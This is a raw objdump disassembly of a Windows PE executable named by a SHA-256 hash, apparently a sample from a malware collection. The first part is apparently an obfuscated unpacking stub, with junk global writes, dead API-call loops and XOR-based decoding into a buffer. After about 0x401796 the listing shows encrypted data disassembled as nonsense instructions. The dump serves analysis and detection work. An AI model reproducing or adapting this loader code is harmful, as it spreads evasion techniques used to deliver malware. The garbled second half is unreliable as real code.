
95eb3969017d1fc39f84cf6540c7978db30248864417a017af9030f0d9671900.exe:     file format pei-i386


Disassembly of section .text:

00401000 <.text>:
  401000:	add    BYTE PTR [eax],al
  401002:	add    BYTE PTR [eax],al
  401004:	adc    al,0x37
  401006:	cmp    DWORD PTR [ebp+0x0],ecx
  401009:	add    BYTE PTR [eax],al
  40100b:	add    BYTE PTR [edx],dh
  40100d:	adc    BYTE PTR [eax],al
  40100f:	add    BYTE PTR [ecx],al
  401011:	add    BYTE PTR [eax],al
  401013:	add    BYTE PTR [ecx],al
  401015:	add    BYTE PTR [eax],al
  401017:	add    BYTE PTR [ecx],al
  401019:	add    BYTE PTR [eax],al
  40101b:	add    BYTE PTR [eax],ch
  40101d:	adc    BYTE PTR [eax],al
  40101f:	add    BYTE PTR [eax+edx*1],ch
  401022:	add    BYTE PTR [eax],al
  401024:	xor    BYTE PTR [eax],dl
  401026:	add    BYTE PTR [eax],al
  401028:	xor    BYTE PTR [eax+eax*1+0x103e00],al
  40102f:	add    BYTE PTR [eax],al
  401031:	add    BYTE PTR [edi+0x6f],dl
  401034:	jb     0x40109a
  401036:	push   edi
  401037:	imul   ebp,DWORD PTR [esi+0x64],0x73776f
  40103e:	aas    
  40103f:	inc    ebx
  401040:	ins    BYTE PTR es:[edi],dx
  401041:	outs   dx,DWORD PTR ds:[esi]
  401042:	jae    0x4010a9
  401044:	push   edi
  401045:	imul   ebp,DWORD PTR [esi+0x64],0x7453776f
  40104c:	popa   
  40104d:	je     0x4010b8
  40104f:	outs   dx,DWORD PTR ds:[esi]
  401050:	outs   dx,BYTE PTR ds:[esi]
  401051:	inc    ebx
  401052:	ins    BYTE PTR es:[edi],dx
  401053:	outs   dx,DWORD PTR ds:[esi]
  401054:	jae    0x4010bb
  401056:	push   edi
  401057:	imul   edx,DWORD PTR [ebp-0x75],0xa4ec81ec
  40105e:	add    BYTE PTR [eax],al
  401060:	add    BYTE PTR [ebx+0x3d11084d],cl
  401066:	add    BYTE PTR [eax-0x7a47ffbe],ah
  40106c:	mov    al,BYTE PTR [eax]
  40106e:	add    BYTE PTR [esi+0x33],ah
  401071:	inc    ecx
  401072:	and    BYTE PTR [ebx],ch
  401074:	or     eax,0x42b00c
  401079:	mov    ecx,0x3b4b
  40107e:	xor    DWORD PTR ds:0x429018,0x42b01c
  401088:	add    ax,cx
  40108b:	adc    ecx,DWORD PTR ds:0x42c010
  401091:	movzx  eax,ax
  401094:	mov    ecx,DWORD PTR ds:0x423e0a
  40109a:	mov    ecx,DWORD PTR [ecx]
  40109c:	sub    DWORD PTR ds:0x42d014,ecx
  4010a2:	mov    DWORD PTR [ebp-0x18],eax
  4010a5:	and    DWORD PTR ds:0x42c008,ebx
  4010ab:	mov    BYTE PTR [ebp-0x1],0x61
  4010af:	sbb    ecx,0x3fcf
  4010b5:	lea    eax,[ebp-0x1]
  4010b8:	xor    ecx,ecx
  4010ba:	xor    ecx,DWORD PTR ds:0x429024
  4010c0:	adc    ecx,DWORD PTR ds:0x42b004
  4010c6:	mov    DWORD PTR ds:0x429024,ecx
  4010cc:	mov    DWORD PTR [ebp-0x10],eax
  4010cf:	mov    ecx,DWORD PTR ds:0x42d01c
  4010d5:	sub    DWORD PTR ds:0x42900c,ecx
  4010db:	mov    al,BYTE PTR [ebp-0x1]
  4010de:	mov    ecx,DWORD PTR [ebp-0x10]
  4010e1:	xor    DWORD PTR ds:0x42b004,0x42900c
  4010eb:	xor    al,0x6f
  4010ed:	sub    al,0xd
  4010ef:	adc    DWORD PTR ds:0x42d008,0x362f
  4010f9:	mov    BYTE PTR [ecx],al
  4010fb:	mov    DWORD PTR ds:0x429020,0x1b
  401105:	cmp    DWORD PTR ds:0x429020,0x0
  40110c:	je     0x40113f
  401112:	cmp    DWORD PTR ds:0x429020,0x24
  401119:	jne    0x40112d
  40111f:	push   DWORD PTR [ebp-0x24]
  401122:	push   0x4244f6
  401127:	call   DWORD PTR ds:0x425010
  40112d:	mov    ecx,DWORD PTR ds:0x429020
  401133:	dec    ecx
  401134:	mov    DWORD PTR ds:0x429020,ecx
  40113a:	jmp    0x401105
  40113f:	mov    DWORD PTR [ebp-0x14],0xf89c85b6
  401146:	push   ebx
  401147:	sub    ecx,eax
  401149:	mov    DWORD PTR [ebp-0x8],0xf89c85b5
  401150:	and    DWORD PTR ds:0x42901c,ebx
  401156:	mov    ecx,DWORD PTR [ebp-0x14]
  401159:	push   esi
  40115a:	mov    eax,0x7510893
  40115f:	xor    ecx,eax
  401161:	or     esi,DWORD PTR ds:0x42900c
  401167:	mov    esi,0x3272db
  40116c:	and    DWORD PTR ds:0x429024,0x1a45
  401176:	push   edi
  401177:	sub    DWORD PTR ds:0x42c018,0x2ac6
  401181:	add    ecx,esi
  401183:	mov    DWORD PTR ds:0x42c008,0x57e6
  40118d:	jmp    0x4011bb
  401192:	mov    DWORD PTR ds:0x42a014,0x4932
  40119c:	mov    dl,BYTE PTR [ebp-0x1]
  40119f:	mov    DWORD PTR ds:0x42d014,0x6fce
  4011a9:	mov    BYTE PTR [ebp+ecx*1-0xa4],dl
  4011b0:	mov    DWORD PTR ds:0x42c010,0x5862
  4011ba:	inc    ecx
  4011bb:	mov    DWORD PTR ds:0x42a018,0x6e07
  4011c5:	cmp    ecx,0x40
  4011c8:	jb     0x401192
  4011ce:	sbb    DWORD PTR ds:0x42a010,0x6c84
  4011d8:	mov    edx,DWORD PTR [ebp-0x14]
  4011db:	add    DWORD PTR ds:0x42b004,0x42900c
  4011e5:	xor    edx,eax
  4011e7:	sub    DWORD PTR ds:0x42c018,0x6b15
  4011f1:	add    edx,esi
  4011f3:	jmp    0x40132b
  4011f8:	add    DWORD PTR ds:0x42b000,ecx
  4011fe:	mov    edi,DWORD PTR [ebp+0x8]
  401201:	mov    DWORD PTR ds:0x42b010,0x1a
  40120b:	cmp    DWORD PTR ds:0x42b010,0x0
  401212:	je     0x40126b
  401218:	cmp    DWORD PTR ds:0x42b010,0x3
  40121f:	jne    0x401233
  401225:	push   0x3d21
  40122a:	push   DWORD PTR [ebp-0x10]
  40122d:	call   DWORD PTR ds:0x425018
  401233:	cmp    DWORD PTR ds:0x42b010,0x4
  40123a:	jne    0x40124f
  401240:	xor    ecx,ecx
  401242:	or     ecx,DWORD PTR ds:0x42b010
  401248:	dec    ecx
  401249:	mov    DWORD PTR ds:0x42b010,ecx
  40124f:	mov    ecx,DWORD PTR ds:0x42b010
  401255:	dec    ecx
  401256:	mov    DWORD PTR ds:0x42b010,ecx
  40125c:	jmp    0x40120b
  401261:	or     DWORD PTR ds:0x429004,0x4238
  40126b:	mov    ecx,0x8a85
  401270:	sbb    DWORD PTR ds:0x42a014,0x4641
  40127a:	xor    cx,WORD PTR [edi+edx*4+0x2]
  40127f:	xor    DWORD PTR ds:0x42901c,edi
  401285:	mov    edi,0x3b4b
  40128a:	add    cx,di
  40128d:	and    DWORD PTR ds:0x42a01c,0x60c1
  401297:	movzx  ecx,cx
  40129a:	mov    DWORD PTR [ebp-0x10],ecx
  40129d:	and    DWORD PTR ds:0x42c014,0x0
  4012a7:	jmp    0x4012b9
  4012ac:	mov    ecx,DWORD PTR ds:0x42c014
  4012b2:	inc    ecx
  4012b3:	mov    DWORD PTR ds:0x42c014,ecx
  4012b9:	cmp    DWORD PTR ds:0x42c014,0x14
  4012c0:	jae    0x4012ec
  4012c6:	cmp    DWORD PTR ds:0x42c014,0x19
  4012cd:	jne    0x4012e5
  4012d3:	push   0x42d008
  4012d8:	push   0x0
  4012da:	push   0x424439
  4012df:	call   DWORD PTR ds:0x42501c
  4012e5:	jmp    0x4012ac
  4012ea:	neg    ecx
  4012ec:	mov    ecx,DWORD PTR [ebp+0x8]
  4012ef:	mov    DWORD PTR ds:0x42a000,0x57bf
  4012f9:	movzx  ecx,WORD PTR [ecx+edx*4]
  4012fd:	xor    ecx,0x8a85
  401303:	add    DWORD PTR ds:0x42b00c,0x42c004
  40130d:	add    ecx,edi
  40130f:	movzx  edi,BYTE PTR ds:0x42c018
  401316:	mov    edi,DWORD PTR [ebp-0x10]
  401319:	mov    BYTE PTR [ebp+edi*1-0xa4],cl
  401320:	mov    DWORD PTR ds:0x429024,0x374e
  40132a:	inc    edx
  40132b:	mov    ecx,0x6cf1
  401330:	mov    ecx,DWORD PTR [ebp-0x18]
  401333:	cmp    edx,ecx
  401335:	jne    0x4011f8
  40133b:	mov    ecx,DWORD PTR [ebp-0x14]
  40133e:	and    DWORD PTR ds:0x42d014,0x0
  401348:	mov    edx,DWORD PTR ds:0x42d014
  40134e:	inc    edx
  40134f:	mov    DWORD PTR ds:0x42d014,edx
  401355:	cmp    DWORD PTR ds:0x42d014,0x1e
  40135c:	jne    0x401370
  401362:	push   0x42a010
  401367:	push   DWORD PTR [ebp-0xc]
  40136a:	call   DWORD PTR ds:0x425020
  401370:	cmp    DWORD PTR ds:0x42d014,0x1a
  401377:	jb     0x401348
  40137d:	mov    edx,DWORD PTR [ebp+0x10]
  401380:	add    DWORD PTR ds:0x429018,0x42d01c
  40138a:	xor    ecx,eax
  40138c:	add    ecx,esi
  40138e:	mov    DWORD PTR [edx],ecx
  401390:	xor    DWORD PTR ds:0x429020,0x151c
  40139a:	mov    ecx,DWORD PTR [ebp-0x14]
  40139d:	sbb    DWORD PTR ds:0x42a004,0x76e2
  4013a7:	xor    ecx,eax
  4013a9:	add    ecx,esi
  4013ab:	mov    DWORD PTR [ebp-0x20],ecx
  4013ae:	mov    DWORD PTR ds:0x42c00c,0x69f9
  4013b8:	mov    DWORD PTR [ebp+0x8],0xf89c85b6
  4013bf:	mov    DWORD PTR [ebp-0xc],0xf89c85a6
  4013c6:	mov    DWORD PTR ds:0x42c00c,ecx
  4013cc:	mov    DWORD PTR [ebp-0x1c],0xf89c95b6
  4013d3:	mov    ecx,DWORD PTR [ebp-0xc]
  4013d6:	mov    DWORD PTR ds:0x429004,0x7870
  4013e0:	mov    DWORD PTR [ebp+0x8],ecx
  4013e3:	jmp    0x4015f6
  4013e8:	xor    DWORD PTR ds:0x42a014,0x45a5
  4013f2:	mov    ecx,DWORD PTR [ebp+0x8]
  4013f5:	and    DWORD PTR ds:0x42b008,0x0
  4013ff:	mov    edx,DWORD PTR ds:0x42b008
  401405:	inc    edx
  401406:	mov    DWORD PTR ds:0x42b008,edx
  40140c:	cmp    DWORD PTR ds:0x42b008,0x29
  401413:	jne    0x401424
  401419:	push   0x3311
  40141e:	call   DWORD PTR ds:0x425028
  401424:	cmp    DWORD PTR ds:0x42b008,0x1f
  40142b:	jb     0x4013ff
  401431:	adc    DWORD PTR ds:0x42a008,0x7a1a
  40143b:	mov    edx,DWORD PTR [ebp-0x8]
  40143e:	neg    DWORD PTR ds:0x42b00c
  401444:	xor    ecx,eax
  401446:	xor    DWORD PTR ds:0x429018,0x42b01c
  401450:	xor    edx,eax
  401452:	or     DWORD PTR ds:0x429020,0x5996
  40145c:	sub    ecx,edx
  40145e:	movzx  edx,BYTE PTR ds:0x42a014
  401465:	adc    DWORD PTR ds:0x429028,edx
  40146b:	sub    ecx,esi
  40146d:	xor    DWORD PTR ds:0x429028,0xa7c
  401477:	xor    ecx,eax
  401479:	not    edx
  40147b:	mov    DWORD PTR [ebp+0x8],ecx
  40147e:	add    DWORD PTR ds:0x42a01c,0x480
  401488:	mov    ecx,DWORD PTR [ebp+0x8]
  40148b:	mov    edx,DWORD PTR [ebp-0x64]
  40148e:	or     DWORD PTR ds:0x429028,0x2c95
  401498:	lea    ecx,[edx+ecx*1+0x5708f5]
  40149f:	and    edx,0x1ea1
  4014a5:	mov    DWORD PTR [ebp-0x64],ecx
  4014a8:	and    DWORD PTR ds:0x42c000,0x0
  4014b2:	jmp    0x4014c4
  4014b7:	mov    ecx,DWORD PTR ds:0x42c000
  4014bd:	inc    ecx
  4014be:	mov    DWORD PTR ds:0x42c000,ecx
  4014c4:	cmp    DWORD PTR ds:0x42c000,0x1f
  4014cb:	jae    0x401506
  4014d1:	cmp    DWORD PTR ds:0x42c000,0x2a
  4014d8:	jne    0x401501
  4014de:	push   DWORD PTR [ebp-0x1c]
  4014e1:	push   DWORD PTR [ebp-0x10]
  4014e4:	push   0x42a004
  4014e9:	push   0x8921
  4014ee:	push   DWORD PTR [ebp-0x24]
  4014f1:	push   0x8115
  4014f6:	push   0x4d38
  4014fb:	call   DWORD PTR ds:0x42502c
  401501:	jmp    0x4014b7
  401506:	mov    ecx,DWORD PTR [ebp+0x8]
  401509:	mov    edx,DWORD PTR [ebp-0x60]
  40150c:	sub    DWORD PTR ds:0x42a000,0x42a01c
  401516:	lea    ecx,[edx+ecx*1+0x5708f5]
  40151d:	neg    edx
  40151f:	mov    DWORD PTR [ebp-0x60],ecx
  401522:	adc    DWORD PTR ds:0x42d01c,edx
  401528:	mov    ecx,DWORD PTR [ebp+0x8]
  40152b:	add    DWORD PTR ds:0x429008,0x3e29
  401535:	mov    edx,DWORD PTR [ebp-0x5c]
  401538:	add    DWORD PTR ds:0x429028,0x42b010
  401542:	lea    ecx,[edx+ecx*1+0x5708f4]
  401549:	and    DWORD PTR ds:0x42d008,0x0
  401553:	mov    edx,DWORD PTR ds:0x42d008
  401559:	inc    edx
  40155a:	mov    DWORD PTR ds:0x42d008,edx
  401560:	cmp    DWORD PTR ds:0x42d008,0x8
  401567:	jne    0x401576
  40156d:	push   DWORD PTR [ebp-0x20]
  401570:	call   DWORD PTR ds:0x425030
  401576:	cmp    DWORD PTR ds:0x42d008,0x7
  40157d:	jne    0x401592
  401583:	xor    edx,edx
  401585:	or     edx,DWORD PTR ds:0x42d008
  40158b:	inc    edx
  40158c:	mov    DWORD PTR ds:0x42d008,edx
  401592:	cmp    DWORD PTR ds:0x42d008,0x17
  401599:	jb     0x401553
  40159f:	xor    edx,DWORD PTR ds:0x42d00c
  4015a5:	mov    DWORD PTR [ebp-0x5c],ecx
  4015a8:	sbb    ecx,edx
  4015aa:	mov    ecx,DWORD PTR [ebp+0x8]
  4015ad:	xor    DWORD PTR ds:0x42b01c,0x42c004
  4015b7:	mov    edx,DWORD PTR [ebp-0x58]
  4015ba:	lea    ecx,[edx+ecx*1+0x5708fb]
  4015c1:	xor    edx,0x2bb1
  4015c7:	mov    DWORD PTR [ebp-0x58],ecx
  4015ca:	mov    ecx,DWORD PTR [ebp+0x8]
  4015cd:	mov    edx,DWORD PTR [ebp-0x54]
  4015d0:	adc    DWORD PTR ds:0x429024,0x7906
  4015da:	lea    ecx,[edx+ecx*1+0x5708fa]
  4015e1:	not    edx
  4015e3:	mov    DWORD PTR [ebp-0x54],ecx
  4015e6:	mov    ecx,DWORD PTR [ebp+0x8]
  4015e9:	mov    edx,DWORD PTR [ebp-0x50]
  4015ec:	lea    ecx,[edx+ecx*1+0x5708f9]
  4015f3:	mov    DWORD PTR [ebp-0x50],ecx
  4015f6:	dec    ecx
  4015f7:	mov    ecx,DWORD PTR [ebp+0x8]
  4015fa:	xor    ecx,eax
  4015fc:	or     DWORD PTR ds:0x42d000,0x34f3
  401606:	add    ecx,esi
  401608:	mov    DWORD PTR ds:0x42c01c,0x3161
  401612:	jne    0x4013e8
  401618:	mov    DWORD PTR ds:0x429018,0x1b23
  401622:	jmp    0x405fe7
  401627:	mov    ecx,DWORD PTR [ebp-0x1c]
  40162a:	and    DWORD PTR ds:0x42c000,0x0
  401634:	jmp    0x401648
  401639:	xor    edx,edx
  40163b:	xor    edx,DWORD PTR ds:0x42c000
  401641:	inc    edx
  401642:	mov    DWORD PTR ds:0x42c000,edx
  401648:	cmp    DWORD PTR ds:0x42c000,0x15
  40164f:	jae    0x4016e1
  401655:	cmp    DWORD PTR ds:0x42c000,0xa
  40165c:	jne    0x40166e
  401662:	push   DWORD PTR [ebp-0x14]
  401665:	push   DWORD PTR [ebp-0x14]
  401668:	call   DWORD PTR ds:0x425034
  40166e:	cmp    DWORD PTR ds:0x42c000,0x9
  401675:	jne    0x40168a
  40167b:	xor    edx,edx
  40167d:	add    edx,DWORD PTR ds:0x42c000
  401683:	inc    edx
  401684:	mov    DWORD PTR ds:0x42c000,edx
  40168a:	jmp    0x401639
  40168f:	and    DWORD PTR ds:0x42c000,0x0
  401699:	mov    edx,DWORD PTR ds:0x42c000
  40169f:	inc    edx
  4016a0:	mov    DWORD PTR ds:0x42c000,edx
  4016a6:	cmp    DWORD PTR ds:0x42c000,0x1e
  4016ad:	jne    0x4016c6
  4016b3:	push   0x424399
  4016b8:	push   0x4244a2
  4016bd:	push   DWORD PTR [ebp-0x18]
  4016c0:	call   DWORD PTR ds:0x42503c
  4016c6:	cmp    DWORD PTR ds:0x42c000,0x12
  4016cd:	jb     0x401699
  4016d3:	xor    edx,edx
  4016d5:	xor    edx,DWORD PTR ds:0x429010
  4016db:	sub    DWORD PTR ds:0x42a01c,edx
  4016e1:	mov    edx,DWORD PTR [ebp-0x8]
  4016e4:	xor    ecx,eax
  4016e6:	xor    edx,eax
  4016e8:	add    DWORD PTR ds:0x429014,0x42d010
  4016f2:	sub    ecx,edx
  4016f4:	mov    DWORD PTR ds:0x42d00c,0x49b3
  4016fe:	sub    ecx,esi
  401700:	xor    ecx,eax
  401702:	mov    DWORD PTR ds:0x42901c,0x3f4e
  40170c:	mov    DWORD PTR [ebp-0x1c],ecx
  40170f:	mov    ecx,DWORD PTR ds:0x42b014
  401715:	mov    ecx,DWORD PTR [ebp-0xc]
  401718:	mov    DWORD PTR [ebp+0x8],ecx
  40171b:	jmp    0x40174d
  401720:	mov    ecx,DWORD PTR [ebp+0x8]
  401723:	mov    edx,DWORD PTR [ebp-0x8]
  401726:	xor    ecx,eax
  401728:	xor    edx,eax
  40172a:	sub    ecx,edx
  40172c:	sub    ecx,esi
  40172e:	xor    ecx,eax
  401730:	mov    DWORD PTR [ebp+0x8],ecx
  401733:	mov    ecx,DWORD PTR [ebp+0x8]
  401736:	mov    edx,DWORD PTR [ebp+0x8]
  401739:	imul   edx,edx,0x5708f5
  40173f:	xor    ecx,eax
  401741:	add    ecx,esi
  401743:	lea    ecx,[ebp+ecx*4-0x64]
  401747:	mov    edi,DWORD PTR [ecx]
  401749:	add    edx,edi
  40174b:	mov    DWORD PTR [ecx],edx
  40174d:	mov    ecx,DWORD PTR [ebp+0x8]
  401750:	xor    ecx,eax
  401752:	add    ecx,esi
  401754:	jne    0x401720
  40175a:	mov    ecx,DWORD PTR [ebp-0x20]
  40175d:	mov    cl,BYTE PTR [ebp+ecx*1-0xa4]
  401764:	mov    dl,BYTE PTR [ebp-0x1]
  401767:	cmp    cl,dl
  401769:	je     0x405f48
  40176f:	mov    ecx,DWORD PTR [ebp-0x20]
  401772:	mov    cl,BYTE PTR [ebp+ecx*1-0xa4]
  401779:	mov    edx,DWORD PTR [ebp+0xc]
  40177c:	cmp    cl,BYTE PTR [edx]
  40177e:	jne    0x405ff9
  401784:	mov    ecx,DWORD PTR [ebp-0x14]
  401787:	mov    edx,DWORD PTR [ebp+0xc]
  40178a:	movsx  edx,BYTE PTR [edx]
  40178d:	xor    ecx,eax
  40178f:	add    ecx,esi
  401791:	jmp    0x403b14
  401796:	add    al,0xcb
  401798:	xchg   edi,eax
  401799:	dec    esp
  40179a:	xchg   edi,eax
  40179b:	in     al,0x63
  40179d:	sbb    DWORD PTR [edx],0xffffff98
  4017a0:	adc    al,0xee
  4017a2:	mov    WORD PTR [edi+0x72],gs
  4017a5:	pop    ebx
  4017a6:	bound  esp,QWORD PTR [edx+0x62]
  4017a9:	bound  ebx,QWORD PTR [edi+ebx*2]
  4017ac:	bound  esp,QWORD PTR [edx+0x9]
  4017af:	xor    BYTE PTR [edi],al
  4017b1:	cmp    eax,0xf033905
  4017b6:	jns    0x4017de
  4017b8:	jne    0x401830
  4017ba:	lods   eax,DWORD PTR ds:[esi]
  4017bb:	jl     0x40182f
  4017bd:	jb     0x401830
  4017bf:	sub    bl,cl
  4017c1:	sar    ch,0x4c
  4017c4:	push   esp
  4017c5:	jae    0x401844
  4017c7:	inc    ebx
  4017c8:	mov    WORD PTR [ecx+esi*2+0x45],?
  4017cc:	scas   eax,DWORD PTR es:[edi]
  4017cd:	inc    ecx
  4017ce:	push   edx
  4017cf:	cmp    al,0x90
  4017d1:	loop   0x40176a
  4017d3:	inc    di
  4017d5:	push   ecx
  4017d6:	jg     0x4017ff
  4017d8:	ins    BYTE PTR es:[edi],dx
  4017d9:	mov    dh,0x7f
  4017db:	mov    esp,0xff3023ba
  4017e0:	jbe    0x4017a2
  4017e2:	loop   0x40182f
  4017e4:	jg     0x401804
  4017e6:	icebp  
  4017e7:	and    eax,0x97f1a2d1
  4017ec:	or     ebx,esi
  4017ee:	xchg   ebx,eax
  4017ef:	xor    eax,0x92b345ef
  4017f4:	fsub   st,st(7)
  4017f6:	jno    0x4017b9
  4017f8:	sbb    al,cl
  4017fa:	out    dx,al
  4017fb:	loop   0x401833
  4017fd:	add    al,0x54
  4017ff:	adc    BYTE PTR [esi],dh
  401801:	jae    0x401877
  401803:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  401804:	(bad)  
  401805:	or     ebx,DWORD PTR [ebp+0x19]
  401808:	mov    dh,0xff
  40180a:	cmc    
  40180b:	push   ebp
  40180c:	xor    ebp,DWORD PTR [eax+0x2a]
  40180f:	aam    0x43
  401811:	in     eax,0x2
  401813:	loop   0x401879
  401815:	mov    ebp,0x5f84c17b
  40181a:	xchg   ebx,eax
  40181b:	mov    ebp,0x2d9a0817
  401820:	jmp    0x4017c0
  401822:	and    BYTE PTR [edx+0x6b],ch
  401825:	adc    eax,edx
  401827:	xor    DWORD PTR [edx-0x6f],ecx
  40182a:	sub    BYTE PTR [ebx],ch
  40182c:	dec    eax
  40182d:	sti    
  40182e:	scas   eax,DWORD PTR es:[edi]
  40182f:	xchg   edx,eax
  401830:	xor    eax,0xd0a7ac95
  401835:	xchg   esp,eax
  401836:	dec    ebp
  401837:	clc    
  401838:	pop    ecx
  401839:	dec    edx
  40183a:	push   eax
  40183b:	adc    BYTE PTR [esi],bh
  40183d:	jmp    0x401865
  40183f:	sbb    esi,DWORD PTR [ecx+0x2cb7d253]
  401845:	fcomp  QWORD PTR [eax]
  401847:	inc    esi
  401848:	loope  0x401894
  40184a:	inc    esi
  40184b:	mov    ecx,0xe4bf74e5
  401850:	pop    edx
  401851:	add    eax,0x1734df52
  401856:	idiv   BYTE PTR ds:0x96a1081b
  40185c:	ins    DWORD PTR es:[edi],dx
  40185d:	movs   DWORD PTR es:[edi],DWORD PTR ss:[esi]
  40185f:	aas    
  401860:	dec    ebx
  401861:	push   eax
  401862:	xchg   ecx,eax
  401863:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  401864:	ds jle 0x40183a
  401867:	mov    esp,0x62b421b3
  40186c:	push   ds
  40186d:	in     al,0xcf
  40186f:	jmp    0x5d332120
  401874:	imul   eax,DWORD PTR [ebp+0x9],0xba8f3259
  40187b:	adc    esp,ebx
  40187d:	div    edi
  40187f:	xchg   esp,eax
  401880:	sar    DWORD PTR [eax+ebx*1-0x31e8ae39],cl
  401887:	outs   dx,DWORD PTR ds:[esi]
  401888:	jb     0x40184e
  40188a:	out    0x4a,eax
  40188c:	mov    bl,0xa
  40188e:	imul   edi,edx,0xffffffd9
  401891:	dec    ebx
  401892:	mov    edx,0x1b6147c8
  401897:	neg    DWORD PTR [esp+ecx*2-0x11]
  40189b:	adc    dl,bh
  40189d:	int3   
  40189e:	jns    0x40190c
  4018a0:	push   es
  4018a1:	fcomp  DWORD PTR [ecx+eiz*4-0x1c1f6b16]
  4018a8:	das    
  4018a9:	pop    ss
  4018aa:	mov    edx,0x45ef4bcd
  4018af:	test   DWORD PTR [edi],ecx
  4018b1:	pop    esi
  4018b2:	std    
  4018b3:	dec    ebx
  4018b4:	(bad)  
  4018b5:	cmp    dl,BYTE PTR [edi]
  4018b7:	ficomp WORD PTR [ebx+ebx*4-0x7f209657]
  4018be:	test   DWORD PTR [edx],ecx
  4018c0:	bound  ebp,QWORD PTR [esi+0x1d]
  4018c3:	std    
  4018c4:	daa    
  4018c5:	pop    ds
  4018c6:	xor    al,0xbd
  4018c8:	jmp    0x670625a6
  4018cd:	sub    esi,DWORD PTR [ebp+0x7]
  4018d0:	mov    ch,0x6f
  4018d2:	push   eax
  4018d3:	div    BYTE PTR [eax-0x589668b4]
  4018d9:	mov    esi,0xea248b92
  4018de:	or     DWORD PTR [eax-0x76],0xfffffff0
  4018e2:	dec    ebp
  4018e3:	ret    0xe6d2
  4018e6:	arpl   WORD PTR [ebx+0x4d],si
  4018e9:	stc    
  4018ea:	scas   al,BYTE PTR es:[edi]
  4018eb:	cdq    
  4018ec:	mov    dl,0xee
  4018ee:	stos   DWORD PTR es:[edi],eax
  4018ef:	jmp    0x388c:0x9e7b4dba
  4018f6:	dec    ecx
  4018f7:	sbb    BYTE PTR [eax+0x70f0d94b],bh
  4018fd:	ins    BYTE PTR es:[edi],dx
  4018fe:	aas    
  4018ff:	je     0x4018bb
  401901:	pop    edi
  401902:	sub    al,BYTE PTR [edx-0x4b]
  401905:	aaa    
  401906:	lods   al,BYTE PTR ds:[esi]
  401907:	out    0x9b,eax
  401909:	dec    eax
  40190a:	sahf   
  40190b:	jbe    0x4018f3
  40190d:	add    al,0x74
  40190f:	cwde   
  401910:	out    0x99,eax
  401912:	rol    bh,1
  401914:	ins    BYTE PTR es:[edi],dx
  401915:	mov    esi,0x33b4853
  40191a:	cld    
  40191b:	test   al,0x50
  40191d:	or     eax,0x477622ac
  401922:	movups XMMWORD PTR [edx-0x56acb2b3],xmm0
  401929:	mov    ah,ch
  40192b:	imul   ebx,DWORD PTR [ecx],0x1e7bc189
  401931:	fs scas eax,DWORD PTR es:[edi]
  401933:	lock mov dl,0xcb
  401936:	fldenv [esi-0x73]
  401939:	repz (bad) 
  40193d:	adc    esp,eax
  40193f:	inc    eax
  401940:	ror    DWORD PTR [edi-0x62c2a2c3],1
  401946:	iret   
  401947:	sub    edx,esi
  401949:	leave  
  40194a:	xor    eax,0xd1057a88
  40194f:	sbb    DWORD PTR [eax],esi
  401951:	sbb    ebp,DWORD PTR ds:0x110c6158
  401957:	lds    esp,FWORD PTR [edi+0x1f]
  40195a:	jae    0x401902
  40195c:	jmp    0x8bb8:0xf67d9371
  401963:	dec    ebp
  401964:	sub    edi,DWORD PTR [edx+eax*1+0x4e72b0bd]
  40196b:	sub    cl,ah
  40196d:	fistp  WORD PTR [ecx+ecx*1-0x10]
  401971:	jbe    0x40194e
  401973:	and    al,0xb2
  401975:	test   DWORD PTR [esi+0x14e15425],edi
  40197b:	(bad)  
  40197c:	rcl    DWORD PTR [edx+0x6],cl
  40197f:	arpl   di,bp
  401981:	or     esp,DWORD PTR [edi+ebx*1]
  401984:	rol    BYTE PTR [eax+ebp*8],1
  401987:	jns    0x4019b8
  401989:	cdq    
  40198a:	inc    esp
  40198b:	cmp    ch,bl
  40198d:	push   ss
  40198e:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40198f:	ja     0x40193e
  401991:	or     al,0x60
  401993:	inc    ecx
  401994:	adc    eax,0x9eb48904
  401999:	jbe    0x4019ef
  40199b:	cdq    
  40199c:	popf   
  40199d:	inc    esi
  40199e:	inc    edi
  40199f:	adc    eax,0x9d0a4620
  4019a4:	push   ss
  4019a5:	ins    DWORD PTR es:[edi],dx
  4019a6:	adc    dh,BYTE PTR [eax]
  4019a8:	stos   DWORD PTR es:[edi],eax
  4019a9:	jmp    0x401967
  4019ab:	cld    
  4019ac:	cmp    ecx,DWORD PTR [esi-0x1b0c8bb8]
  4019b2:	pop    ebx
  4019b3:	mov    bh,0x94
  4019b5:	mov    edi,0x86782652
  4019ba:	lahf   
  4019bb:	or     DWORD PTR [esi],eax
  4019bd:	and    al,dh
  4019bf:	dec    edx
  4019c0:	mov    ch,0xc
  4019c2:	out    dx,al
  4019c3:	test   bl,ah
  4019c5:	cdq    
  4019c6:	mov    dl,0xec
  4019c8:	jmp    0x23a806a8
  4019cd:	and    BYTE PTR [edi+0x1dd4575f],dl
  4019d3:	ret    0xf69e
  4019d6:	pop    esp
  4019d7:	push   ebp
  4019d8:	mov    bh,0x9c
  4019da:	mov    ch,0x30
  4019dc:	js     0x401a47
  4019de:	sub    esi,DWORD PTR [edi]
  4019e0:	in     eax,0x21
  4019e2:	lahf   
  4019e3:	jns    0x40198b
  4019e5:	test   eax,0x2f6a23c
  4019ea:	push   0xd263f02b
  4019ef:	idiv   BYTE PTR [ebx+0x37]
  4019f2:	pop    esi
  4019f3:	push   eax
  4019f4:	xchg   esp,eax
  4019f5:	outs   dx,DWORD PTR ds:[esi]
  4019f6:	mov    dh,0xd9
  4019f8:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4019f9:	and    al,0x80
  4019fb:	or     si,WORD PTR [ebx-0x637c3285]
  401a02:	das    
  401a03:	fisub  WORD PTR [ecx+0x6c]
  401a06:	fisubr WORD PTR [ebp+0x37]
  401a09:	addr16 cwde 
  401a0b:	loopne 0x4019dc
  401a0d:	mov    bl,0x9e
  401a0f:	out    0xf,eax
  401a11:	int    0x3
  401a13:	sbb    DWORD PTR [edi-0x10],ebx
  401a16:	add    BYTE PTR [edi-0x5f],0x21
  401a1a:	add    BYTE PTR [eax],0x81
  401a1d:	outs   dx,BYTE PTR ds:[esi]
  401a1e:	inc    ebp
  401a1f:	push   esp
  401a20:	gs pop ebx
  401a22:	les    ebx,FWORD PTR [edx+0x2e]
  401a25:	mov    ds:0xf824e25d,al
  401a2a:	adc    DWORD PTR ds:0xa706ca53,0xa5af0e1c
  401a34:	sub    BYTE PTR ss:[eax+0xf],bl
  401a38:	mov    eax,ds:0xd5c2179b
  401a3d:	mov    al,ds:0x539bff73
